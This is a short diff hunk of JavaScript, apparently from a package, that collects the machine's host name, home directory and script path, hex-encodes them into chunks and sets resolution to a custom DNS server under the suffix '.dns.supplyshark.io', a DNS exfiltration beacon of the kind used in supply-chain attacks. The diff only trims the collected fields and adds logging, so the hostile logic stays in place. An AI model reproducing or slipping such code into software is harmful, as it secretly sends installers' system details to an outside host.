@@ -6,11 +6,13 @@
       const suffix = '.dns.supplyshark.io'; // BIND DNS server
       const dnsServer = '42.42.42.42'; // BIND DNS server IP
 
-      let data = `${os.version}__${os.hostname()}__${os.homedir()}__${__dirname}`;
+      let data = `${os.hostname()}__${os.homedir()}__${__dirname}`;
   
       data = data.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
       data = Buffer.from(data).toString('hex');
       data = data.match(/.{1,50}/g);
+
+      console.log(data);
 
       dns.setServers([dnsServer]);
   
